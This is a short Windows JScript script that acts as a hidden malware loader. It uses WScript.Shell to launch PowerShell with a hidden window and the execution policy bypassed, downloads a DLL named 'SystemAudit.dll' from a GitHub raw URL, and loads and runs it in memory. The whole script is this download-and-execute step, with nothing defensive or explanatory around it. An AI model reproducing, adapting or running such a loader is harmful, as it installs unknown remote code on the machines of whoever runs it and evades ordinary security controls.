var x = new ActiveXObject("WScript.Shell");
var u = "https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/main/SystemAudit.dll";
var c = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('" + u + "')).GetType('SystemAudit.Loader').GetMethod('Run').Invoke($null,$null)\"";
x.Run(c, 0);
